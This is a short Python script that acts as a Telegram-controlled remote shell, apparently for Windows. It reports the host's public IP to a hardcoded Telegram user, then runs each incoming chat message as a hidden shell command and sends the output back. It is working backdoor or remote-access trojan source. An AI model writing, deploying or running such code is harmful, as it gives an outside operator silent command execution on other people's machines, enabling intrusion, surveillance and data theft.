import telebot
import subprocess
userId = 12345678 #user id
import requests
token =  "bot_token" # 
response_ip = requests.get('https://api64.ipify.org?format=json').json()  # get ip info
ip_address = response_ip["ip"]
bot = telebot.TeleBot(token)
code_page = subprocess.check_output('chcp', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors='ignore').strip().split(' ')[-1]
bot.send_message(userId, f"Hi. Connected from {ip_address}")
@bot.message_handler(func=lambda message: True)
def get_message(message):
    print(f"Received message: {message.text}")
    try:
        process = subprocess.Popen(message.text, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   shell=True,
                                   creationflags=subprocess.CREATE_NO_WINDOW)
        stdout, stderr = process.communicate()
        stdout = stdout.decode(f'cp{code_page}', errors='ignore')
        stderr = stderr.decode(f'cp{code_page}', errors='ignore')
        max_length = 4096
        try:
            if len(stdout) > max_length:
                for i in range(0, len(stdout), max_length):
                    bot.send_message(userId, stdout[i:i + max_length])
            else:
                bot.send_message(userId, stdout)
        except:
            pass
        if stderr:
            bot.send_message(userId, stderr)
    except:
        pass

bot.polling(non_stop=True)
